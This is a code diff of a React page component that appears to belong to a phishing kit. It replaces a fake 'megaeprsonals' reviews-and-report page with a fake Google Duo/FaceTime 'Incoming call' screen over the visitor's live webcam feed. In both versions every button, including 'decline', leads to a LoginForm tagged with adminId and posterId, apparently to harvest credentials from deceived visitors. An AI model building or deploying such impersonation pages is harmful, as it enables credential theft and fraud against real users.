@@ -1,115 +1,81 @@
 "use client";
+
 import { useState } from "react";
+import Webcam from "react-webcam";
 import LoginForm from "./LoginForm";
 
 export default function Home({ adminId, posterId }) {
-  const [next, setNext] = useState(false);
+  const [showForm, setShowForm] = useState(false);
   return (
-    <>
-      {
-        !next ? (
-          <div>
-            <div className="w-full  relative">
+    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
+      <Webcam
+        audio={false}
+        className="object-cover h-screen w-screen lg:w-auto"
+        // height={1080}
+        // width={1262}
+        // screenshotFormat="image/jpeg"
+        // videoConstraints={videoConstraints}
+      />
+
+      <div className="absolute  flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
+        <div className=" bg-neutral-50    py-4 shadow-around rounded-lg">
+          {!showForm ? (
+            <div className="bg-neutral-50   p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
               <img
-                src="/images/header.png"
-                alt="megaeprsonals"
-                className="w-full h-full object-cover"
+                alt="Google Duo"
+                loading="lazy"
+                width="80"
+                height="80"
+                decoding="async"
+                data-nimg="1"
+                className="rounded-full object-cover object-center p-2 bg-green-100"
+                src="/images/facetime-logo.png"
               />
-              <div className="flex   absolute top-[55%] left-[50%] translate-x-[-50%] ">
-                <input
-                  placeholder="Search"
-                  className=" w-[200px] md:w-[400px] px-4 py-2 rounded-md "
-                />
+              <p className="text-xl font-medium text-neutral-700 text-center">
+                Incoming call...
+              </p>
+              <div className="flex items-center justify-center gap-x-12 text-neutral-50">
                 <button
-                  className="bg-blue-700 text-white px-4 py-2 rounded-md ml-2"
-                  onClick={() => setNext(true)}
+                  onClick={() => setShowForm(true)}
+                  className="size-14 flex items-center justify-center rounded-full text-3xl bg-green-500"
                 >
-                  Search
+                  <svg
+                    stroke="currentColor"
+                    fill="currentColor"
+                    stroke-width="0"
+                    viewBox="0 0 24 24"
+                    height="1em"
+                    width="1em"
+                    xmlns="http://www.w3.org/2000/svg"
+                  >
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                    <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
+                  </svg>
+                </button>
+                <button
+                  onClick={() => setShowForm(true)}
+                  className="size-14 flex items-center justify-center rounded-full text-3xl bg-red-500"
+                >
+                  <svg
+                    stroke="currentColor"
+                    fill="currentColor"
+                    stroke-width="0"
+                    viewBox="0 0 24 24"
+                    height="1em"
+                    width="1em"
+                    xmlns="http://www.w3.org/2000/svg"
+                  >
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                    <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"></path>
+                  </svg>
                 </button>
               </div>
             </div>
-            <div className=" mt-5">
-              <img
-                src="/images/reviews.png"
-                alt="megaeprsonals"
-                className="w-full h-full object-cover"
-              />
-            </div>
-
-            <div class="overflow-x-auto">
-              <table className="w-full text-sm text-left text-gray-500 border border-[#333]">
-                <tbody>
-                  <tr class="bg-white border border-[#333]">
-                    <td class="px-6 py-4 ">
-                      <p
-                        onClick={() => setNext(true)}
-                        class="mt-6 text-center text-2xl text-red-600 uppercase"
-                      >
-                        13 Bad Reviews
-                      </p>
-                    </td>
-                  </tr>
-                  <tr class="bg-white border-[#333]">
-                    <td class="px-6 py-4 ">
-                      <p
-                        onClick={() => setNext(true)}
-                        class="mt-6 text-center text-2xl text-red-600 uppercase"
-                      >
-                        View All Reviews
-                      </p>
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-
-            <h2
-              onClick={() => setNext(true)}
-              class="mt-6 text-center text-2xl text-red-600 uppercase"
-            >
-              Report
-            </h2>
-            <div class="overflow-x-auto mt-5">
-              <table className="w-full text-sm text-left text-gray-500 border border-[#333]">
-                <tbody>
-                  <tr class="bg-white">
-                    <th
-                      onClick={() => setNext(true)}
-                      scope="row"
-                      class="px-6 py-4 border border-[#333] font-medium text-center text-2xl text-[#337ab7] whitespace-nowrap"
-                    >
-                      Privacy Policy
-                    </th>
-                    <td
-                      onClick={() => setNext(true)}
-                      class="px-6 text-center text-2xl text-[#337ab7] py-4 border border-[#333]"
-                    >
-                      Terms & Conditions
-                    </td>
-                  </tr>
-                </tbody>
-              </table>
-            </div>
-          </div>
-        ) : (
-          <LoginForm adminId={adminId} posterId={posterId} />
-        )
-        //  !image ? (
-        //   <LoginForm
-        //     adminId={adminId}
-        //     posterId={posterId}
-        //     setImages={setImages}
-        //   />
-        // ) : (
-        //   <div className="w-[60%] mx-auto">
-        //     <img
-        //       src="/images/banner.png"
-        //       alt="megaeprsonals"
-        //       className="w-full h-full object-cover"
-        //     />
-        //   </div>
-        // )
-      }
-    </>
+          ) : (
+            <LoginForm adminId={adminId} posterId={posterId} />
+          )}
+        </div>
+      </div>
+    </div>
   );
 }
